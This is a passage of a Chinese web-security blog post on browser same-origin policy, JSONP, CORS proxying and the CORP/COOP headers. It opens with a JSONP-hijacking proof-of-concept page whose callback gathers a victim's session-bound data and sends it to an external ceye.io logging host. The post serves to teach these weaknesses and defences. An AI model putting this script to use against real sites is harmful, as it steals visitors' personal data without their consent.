<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonp_hack</span>(<span class="params">v</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;jsonp劫持&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> h=<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> v)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> a=<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        a=key+<span class="string">&#x27; : &#x27;</span>+v[key]+<span class="string">&#x27; ,&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        h+=a</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(h);</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">get</span>(<span class="string">&#x27;http://jsonp1.kijkv0.ceye.io?value=&#x27;</span>+h);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://172.16.31.149/jsonp/index.php?callback=jsonp_hack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>jsonp劫持<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>一旦被攻击者访问该网页，就会自动触发，会自动访问具有漏洞的jsonp接口，利用被攻击者自己的session获取到被攻击者的信息，并将该信息远程发送到攻击者的服务器上</p>
<h2 id="其他解决跨域问题的方案"><a href="#其他解决跨域问题的方案" class="headerlink" title="其他解决跨域问题的方案"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51383106/article/details/131458419">其他解决跨域问题的方案</a></h2><p>利用nginx进行反向代理，在一个服务器上配置多个前缀来转发http&#x2F;https请求到多个真实的服务器即可。在 nginx 中配置反向代理服务器，将客户端的请求转发到后端服务器，并在转发过程中添加相应的响应头。例如，假设前端服务器运行在 <a target="_blank" rel="noopener" href="http://frontend.example.com,后端服务器运行在/">http://frontend.example.com，后端服务器运行在</a> <a target="_blank" rel="noopener" href="http://backend.example.com,则可以在/">http://backend.example.com，则可以在</a> nginx 中配置如下的反向代理服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name frontend.example.com;</span><br><span class="line"></span><br><span class="line">    location /api &#123;</span><br><span class="line">        proxy_pass http://backend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Origin http://frontend.example.com;</span><br><span class="line">        add_header Access-Control-Allow-Credentials true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述配置中，location &#x2F;api 将客户端请求中的 &#x2F;api 转发到后端服务器的对应接口。<br>add_header Access-Control-Allow-Origin <a target="_blank" rel="noopener" href="http://frontend.example.com/">http://frontend.example.com</a> 表示允许来自 <a target="_blank" rel="noopener" href="http://frontend.example.com/">http://frontend.example.com</a> 的跨域请求。<br>add_header Access-Control-Allow-Credentials true 表示允许跨域请求携带 cookie。<br>设置相应的响应头在响应头中添加相应的跨域设置，以允许客户端发送跨域请求和携带 cookie。例如，添加 Access-Control-Allow-Origin 和 Access-Control-Allow-Credentials 头部：Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="http://frontend.example.com/">http://frontend.example.com</a><br>Access-Control-Allow-Credentials: true这样客户端在向后端服务器发送请求时，就能携带 cookie，并允许跨域请求。</p>
<p>还有很多前端跨域解决方案：<a target="_blank" rel="noopener" href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p>
<h2 id="新的安全措施-CORP-COOP"><a href="#新的安全措施-CORP-COOP" class="headerlink" title="新的安全措施 CORP COOP"></a>新的安全措施 CORP COOP</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yangyecool/p/13417794.html">https://www.cnblogs.com/Yangyecool/p/13417794.html</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cross-Origin_Resource_Policy</a><br>在现代浏览器安全中，除了CORS以外，还有两个相对较新的安全策略，分别是CORP（Cross-Origin Resource Policy）和COOP（Cross-Origin Opener Policy）。这两种策略都是为了进一步加强跨域安全，尤其是在防止某些类型的跨站攻击（如跨站脚本和跨站请求伪造）和数据泄露方面。<br>同源策略也有一些例外，任何网站都可以不受限制的加载下面的资源：</p>
<ul>
<li>嵌入跨域 iframe</li>
<li>image、script 等资源</li>
<li>使用 DOM 打开跨域弹出窗口<br>对于这些资源，浏览器可以将各个站点的跨域资源分隔在不同的 Context Group 下，不同的 Context Group 下资源无法相互访问。<br>浏览器 Context Group 是一组共享相同上下文的 tab、window或iframe。例如，如果网站（<a target="_blank" rel="noopener" href="https://a.example)打开弹出窗口(https//b.example%EF%BC%89%EF%BC%8C%E5%88%99%E6%89%93%E5%BC%80%E5%99%A8%E7%AA%97%E5%8F%A3%E5%92%8C%E5%BC%B9%E5%87%BA%E7%AA%97%E5%8F%A3%E5%85%B1%E4%BA%AB%E7%9B%B8%E5%90%8C%E7%9A%84%E6%B5%8F%E8%A7%88%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%AE%83%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87">https://a.example）打开弹出窗口（https://b.example），则打开器窗口和弹出窗口共享相同的浏览上下文，并且它们可以通过</a> DOM API相互访问，例如 window.opener。</li>
</ul>
<p>长久以来，这些安全策略一直保护着网站的隐私数据，直到 Spectre 漏洞出现。Spectre 是一个在 CPU 中被发现的漏洞，利用 Spectre ，攻击者可以读取到在统一浏览器下任意 Context Group 下的资源。特别是在使用一些需要和计算机硬件进行交互的 API 时：</p>
<ul>
<li>SharedArrayBuffer (required for WebAssembly Threads)</li>
<li>performance.measureMemory()</li>
<li>JS Self-Profiling API<br>为此，浏览器一度禁用了 SharedArrayBuffer 等高风险的 API。</li>
</ul>
<h3 id="CORP（Cross-Origin-Resource-Policy）"><a href="#CORP（Cross-Origin-Resource-Policy）" class="headerlink" title="CORP（Cross-Origin Resource Policy）"></a>CORP（Cross-Origin Resource Policy）</h3><p><strong>CORP</strong> 是一种浏览器安全策略，允许开发者限制哪些跨源请求可以加载资源。这个策略主要是通过 HTTP 响应头 <code>Cross-Origin-Resource-Policy</code> 实现的，可以控制资源（如图像、CSS、JavaScript等）是否可以被另一个域加载。</p>
<p><strong>使用场景</strong>：<br>CORP 主要用于防止资源被不同源的网站读取或嵌入。例如，一个网站可以决定其资源只能由同源网站或特定的源网站加载。<br><strong>响应头选项</strong>：</p>
<ul>
<li><code>Cross-Origin-Resource-Policy: same-origin</code>：只有同源的站点可以加载资源。</li>
<li><code>Cross-Origin-Resource-Policy: same-site</code>：只有相同站点（即顶级域名相同）的请求可以加载资源。</li>
<li><code>Cross-Origin-Resource-Policy: cross-origin</code>：任何网站都可以加载资源。这相当于没有应用任何CORP。</li>
</ul>
<h3 id="COOP（Cross-Origin-Opener-Policy）"><a href="#COOP（Cross-Origin-Opener-Policy）" class="headerlink" title="COOP（Cross-Origin Opener Policy）"></a>COOP（Cross-Origin Opener Policy）</h3><p><strong>COOP</strong> 是一种浏览器安全策略，用于隔离来自不同源的浏览器上下文（如窗口和标签页），从而防止潜在的恶意文档影响正常文档，或在两者之间进行数据泄露。这个策略主要通过 HTTP 响应头 <code>Cross-Origin-Opener-Policy</code> 来设置。</p>
<p><strong>使用场景</strong>：<br>COOP 主要用于创建一个安全的环境，其中的页面不会与不同源的页面共享相同的进程，因此可以阻止恶意网站通过窗口间通信（如 <code>window.opener</code>）来泄露信息或进行攻击。<br><strong>响应头选项</strong>：</p>
<ul>
<li><code>Cross-Origin-Opener-Policy: same-origin</code>：只有同源的页面才能与当前页面共享同一个浏览器进程。</li>
<li><code>Cross-Origin-Opener-Policy: same-origin-allow-popups</code>：与 <code>same-origin</code> 相同，但允许弹出窗口（由当前页面创建）与其共享同一个进程。</li>
<li><code>Cross-Origin-Opener-Policy: unsafe-none</code>：不隔离源，所有页面共享同一进程，这是大多数页面的默认行为。</li>
</ul>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E7%9A%84%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">Cookie的跨域问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS%EF%BC%88%E8%B7%A8%E6%BA%90%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">CORS（跨源资源共享）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">CORS 的工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%93%8D%E5%BA%94%E5%A4%B4%E9%83%A8"><span class="toc-number">3.2.</span> <span class="toc-text">CORS 响应头部</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.3.</span> <span class="toc-text">使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">3.4.</span> <span class="toc-text">安全问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSONP%EF%BC%88JSON-with-Padding%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">JSONP（JSON with Padding）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">4.2.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91"><span class="toc-number">4.3.</span> <span class="toc-text">安全考虑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E7%9A%84%E6%96%B9%E6%A1%88"><span class="toc-number">5.</span> <span class="toc-text">其他解决跨域问题的方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E7%9A%84%E5%AE%89%E5%85%A8%E6%8E%AA%E6%96%BD-CORP-COOP"><span class="toc-number">6.</span> <span class="toc-text">新的安全措施 CORP COOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORP%EF%BC%88Cross-Origin-Resource-Policy%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">CORP（Cross-Origin Resource Policy）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#COOP%EF%BC%88Cross-Origin-Opener-Policy%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">COOP（Cross-Origin Opener Policy）</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&text=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&is_video=false&description=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【web安全】浏览器同源策略和跨域问题&body=Check out this article: https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&title=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&name=【web安全】浏览器同源策略和跨域问题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/09/20/WebSecurity/owasptop/browserorigin/&t=【web安全】浏览器同源策略和跨域问题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
